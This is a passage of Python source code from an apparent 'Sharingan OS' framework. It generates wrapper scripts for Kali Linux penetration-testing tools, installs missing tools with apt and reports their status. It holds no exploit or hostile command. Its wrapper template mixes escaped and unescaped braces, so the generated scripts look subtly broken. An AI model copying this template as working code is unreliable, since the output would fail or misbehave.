            Dict avec les résultats de l'exécution
        """
        if args is None:
            args = []

        # Vérifier l'installation
        if not self.check_installation():
            return {{
                "success": False,
                "error": f"Tool {{self.name}} is not installed",
                "installation_hint": f"Run: apt install {self.command}"
            }}

        # Vérifier les permissions root si nécessaire
        if self.requires_root and os.geteuid() != 0:
            return {{
                "success": False,
                "error": f"Tool {{self.name}} requires root privileges",
                "hint": "Run with sudo"
            }}

        # Préparer la commande
        cmd = [self.command] + args

        # Options
        timeout = kwargs.get('timeout', self.timeout)
        retries = kwargs.get('retries', self.max_retries)
        background = kwargs.get('background', False)

        result = {{
            "tool": self.name,
            "command": " ".join(cmd),
            "start_time": datetime.now().isoformat(),
            "timeout": timeout,
            "retries": retries
        }}

        for attempt in range(retries + 1):
            try:
                start_time = time.time()

                if background:
                    # Exécution en arrière-plan
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    result["pid"] = process.pid
                    result["success"] = True
                    result["background"] = True
                    result["execution_time"] = 0.0
                    break

                else:
                    # Exécution normale
                    proc_result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        timeout=timeout
                    )

                    execution_time = time.time() - start_time

                    result.update({{
                        "success": proc_result.returncode == 0,
                        "returncode": proc_result.returncode,
                        "stdout": proc_result.stdout,
                        "stderr": proc_result.stderr,
                        "execution_time": execution_time,
                        "attempt": attempt + 1
                    }})

                    if proc_result.returncode == 0:
                        break
                    elif attempt < retries:
                        continue

            except subprocess.TimeoutExpired:
                result.update({{
                    "success": False,
                    "error": f"Command timed out after {{timeout}}s",
                    "timeout": True,
                    "attempt": attempt + 1
                }})
            except Exception as e:
                result.update({{
                    "success": False,
                    "error": str(e),
                    "attempt": attempt + 1
                }})

        result["end_time"] = datetime.now().isoformat()
        return result

    def show_help(self):
        """Affiche l'aide de l'outil"""
        try:
            result = subprocess.run(
                [self.command, "--help"],
                capture_output=True,
                text=True,
                timeout=30
            )
            print(result.stdout)
            if result.stderr:
                print("STDERR:", result.stderr)
        except:
            print(f"No --help available for {self.name}")

    def show_examples(self):
        """Affiche les exemples d'utilisation"""
        print(f"\\n{self.name.upper()} - {self.description}")
        print("=" * 60)
        print("\\nExemples d'utilisation:")
        print("-" * 30)

        for i, example in enumerate(EXAMPLES, 1):
            print(f"{i}. {example}")

        print("\\n" + "=" * 60)

def main():
    """Point d'entrée principal"""
    import argparse

    parser = argparse.ArgumentParser(
        description=f"Sharingan OS - {{TOOL_NAME}} Wrapper",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument(
        "args",
        nargs="*",
        help="Arguments à passer à l'outil"
    )

    parser.add_argument(
        "--help-tool",
        action="store_true",
        help="Afficher l'aide de l'outil original"
    )

    parser.add_argument(
        "--examples",
        action="store_true",
        help="Afficher les exemples d'utilisation"
    )

    parser.add_argument(
        "--json",
        action="store_true",
        help="Sortie au format JSON"
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=TIMEOUT,
        help=f"Timeout en secondes (défaut: {{TIMEOUT}})"
    )

    parser.add_argument(
        "--background",
        action="store_true",
        help="Exécuter en arrière-plan"
    )

    args, unknown = parser.parse_known_args()

    wrapper = {tool_config.name.title()}Wrapper()

    if args.help_tool:
        wrapper.show_help()
        return

    if args.examples:
        wrapper.show_examples()
        return

    # Exécuter l'outil
    result = wrapper.run(
        args.args + unknown,
        timeout=args.timeout,
        background=args.background
    )

    if args.json:
        print(json.dumps(result, indent=2, default=str))
    else:
        if result.get("success"):
            if result.get("background"):
                print(f"✓ {{result['tool']}} started in background (PID: {{result['pid']}})")
            else:
                print(f"✓ {{result['tool']}} executed successfully")
                print(f"Execution time: {result['execution_time']:.2f}s")
                if result.get("stdout"):
                    print("\\nOutput:")
                    print(result["stdout"])
        else:
            print(f"✗ {{result['tool']}} execution failed")
            if "error" in result:
                print(f"Error: {{result['error']}}")

        if result.get("stderr"):
            print("\\nSTDERR:")
            print(result["stderr"])

if __name__ == "__main__":
    main()
'''

    def create_all_wrappers(self) -> Dict[str, str]:
        """Crée des wrappers pour tous les outils"""
        results = {}

        logger.info("Creating wrappers for all Kali tools...")

        for tool_name in self.registry.get_all_tools():
            try:
                wrapper_path = self.create_wrapper(tool_name)
                if wrapper_path:
                    results[tool_name] = wrapper_path
                    logger.info(f"Created wrapper for {tool_name}")
                else:
                    logger.warning(f"Failed to create wrapper for {tool_name}")
            except Exception as e:
                logger.error(f"Error creating wrapper for {tool_name}: {e}")

        logger.info(f"Created {len(results)} wrappers")
        return results

    def get_cloning_status(self) -> Dict[str, Any]:
        """Retourne le statut du clonage"""
        return self.cloner.get_status()

    def get_tools_status(self) -> Dict[str, Any]:
        """Retourne le statut de tous les outils"""
        tools_status = {}

        for tool_name, tool_config in self.registry.get_all_tools().items():
            # Vérifier si installé
            installed = self._is_tool_installed(tool_config)

            # Vérifier si repo cloné
            repo_cloned = (self.repos_dir / tool_name).exists()

            # Vérifier si wrapper créé
            wrapper_exists = (self.wrappers_dir / f"{tool_name}_wrapper.py").exists()

            tools_status[tool_name] = {
                "installed": installed,
                "repo_cloned": repo_cloned,
                "wrapper_created": wrapper_exists,
                "category": tool_config.category,
                "requires_root": tool_config.requires_root
            }

        return {
            "total_tools": len(tools_status),
            "installed": sum(1 for t in tools_status.values() if t["installed"]),
            "repos_cloned": sum(1 for t in tools_status.values() if t["repo_cloned"]),
            "wrappers_created": sum(1 for t in tools_status.values() if t["wrapper_created"]),
            "tools": tools_status
        }

    def _is_tool_installed(self, tool_config: KaliToolConfig) -> bool:
        """Vérifie si un outil est installé"""
        try:
            result = subprocess.run(
                ["which", tool_config.command],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False

    def install_tool(self, tool_name: str) -> Dict[str, Any]:
        """Installe un outil Kali"""
        tool_config = self.registry.get_tool(tool_name)
        if not tool_config:
            return {"error": f"Unknown tool: {tool_name}"}

        if not tool_config.package_name:
            return {"error": f"No package name for tool: {tool_name}"}

        try:
            logger.info(f"Installing {tool_name}...")

            # Update package list
            subprocess.run(["apt", "update"], check=True, capture_output=True)

            # Install package
            result = subprocess.run(
                ["apt", "install", "-y", tool_config.package_name],
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                return {
                    "success": True,
                    "message": f"Successfully installed {tool_name}",
                    "stdout": result.stdout
                }
            else:
                return {
                    "success": False,
                    "error": f"Installation failed: {result.stderr}"
                }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def install_missing_tools(self) -> Dict[str, Any]:
        """Installe tous les outils manquants"""
        logger.info("Installing missing Kali tools...")

        results = {}
        installed_count = 0
        failed_count = 0

        for tool_name, tool_config in self.registry.get_all_tools().items():
            if not self._is_tool_installed(tool_config):
                result = self.install_tool(tool_name)
                results[tool_name] = result

                if result.get("success"):
                    installed_count += 1
                    logger.info(f"Installed {tool_name}")
                else:
                    failed_count += 1
                    logger.error(f"Failed to install {tool_name}: {result.get('error', 'Unknown error')}")
            else:
                results[tool_name] = {"status": "already_installed"}

        return {
            "total_attempted": len(results),
            "installed": installed_count,
            "failed": failed_count,
            "results": results
        }

def get_kali_tools_manager() -> KaliToolsManager:
    """Get Kali tools manager instance"""
    return KaliToolsManager()

if __name__ == "__main__":
    print("🔥 Sharingan OS - Complete Kali Tools Integration Framework")
    print("=" * 70)

    manager = KaliToolsManager()

    print(f"📊 Registry loaded: {len(manager.registry.get_all_tools())} tools")
    print(f"📂 Categories: {list(manager.registry.get_categories().keys())}")

    # Afficher le statut
    status = manager.get_tools_status()
    print(f"\\n📈 Status:")
    print(f"  Total tools: {status['total_tools']}")
    print(f"  Installed: {status['installed']}")
    print(f"  Repos cloned: {status['repos_cloned']}")
    print(f"  Wrappers created: {status['wrappers_created']}")

    # Afficher le statut du clonage
    clone_status = manager.get_cloning_status()
    print(f"\\n🔄 Cloning status:")
    print(f"  Active downloads: {len(clone_status['active_downloads'])}")
    print(f"  Queue size: {clone_status['queue_size']}")
    print(f"  Completed: {clone_status['completed']}")

    if clone_status['active_downloads']:
        print(f"  Currently cloning: {', '.join(clone_status['active_downloads'][:3])}")

    print(f"\\n💡 Usage:")
    print(f"  manager.create_wrapper('nmap')  # Create wrapper")
    print(f"  manager.install_tool('nmap')    # Install tool")
    print(f"  manager.get_tools_status()      # Get status")
    print(f"  manager.get_cloning_status()    # Get cloning status")

    print(f"\\n✅ Kali Tools Integration Framework ready!")
    print(f"Background cloning started - check status periodically")
